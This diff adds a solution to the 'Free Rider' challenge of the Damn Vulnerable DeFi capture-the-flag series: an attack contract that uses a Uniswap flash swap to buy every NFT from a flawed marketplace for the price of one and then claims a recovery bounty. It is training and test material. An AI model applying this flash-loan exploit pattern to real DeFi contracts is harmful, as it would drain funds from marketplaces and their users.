@@ -123,7 +123,15 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        AttackFreeRider attackFreeRider = new AttackFreeRider{value : 0.045 ether}(
+            address(uniswapPair),
+            address(marketplace),
+            address(weth),
+            address(nft),
+            address(recoveryManager)
+        );
+
+        attackFreeRider.start();
     }
 
     /**
@@ -145,4 +153,62 @@ contract FreeRiderChallenge is Test {
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
     }
+}
+
+contract AttackFreeRider {
+    IUniswapV2Pair public pair;
+    FreeRiderNFTMarketplace public marketplace ;
+
+    WETH public weth;
+    DamnValuableNFT public nft;
+
+    address public recoveryContract;
+    address public player;
+
+    uint private constant NFT_PRICE = 15 ether;
+    uint[] private tokens = [0,1,2,3,4,5];
+
+    constructor (address _pair, address _marketplace, address _weth, address _nft, address _recoveryContract) payable {
+        pair = IUniswapV2Pair(_pair);
+        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
+        weth = WETH(payable(_weth));
+        nft = DamnValuableNFT(_nft);
+        recoveryContract = _recoveryContract;
+        player = msg.sender;
+    }
+
+    function start() public {
+        // 1. Request a flashswap of 15 Eth from uniswap pair
+        pair.swap(NFT_PRICE, 0 , address(this), "1");
+    }
+
+    function uniswapV2Call(address /*sender*/, uint /*amount*/, uint256, bytes calldata /*data*/) external {
+        // Access control 
+        require(msg.sender == address(pair));
+        require(tx.origin == player);
+
+        // 2. unwrap WETH to ETH
+        weth.withdraw(NFT_PRICE);
+
+        // 3. Buy all the NFTs from the pool 
+        marketplace.buyMany{ value : NFT_PRICE }(tokens);
+
+        // 4. Pay the 15 weth with charges hmm 0.3%
+        uint256 amountToReturn = NFT_PRICE * 1004/1000;
+        weth.deposit{value : amountToReturn}();
+        weth.transfer(address(pair), amountToReturn);
+
+        // 5. Send NFTs to recovery account so we can get the bounty
+        bytes memory data = abi.encode(player);
+        for(uint256 i ; i < tokens.length ; i ++) {
+            nft.safeTransferFrom(address(this), recoveryContract, i, data);
+        }
+    }
+
+    // To make sure safeTransferfrom won't revert
+    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4){
+            return 0x150b7a02;
+    }
+
+    receive() external payable{}
 }
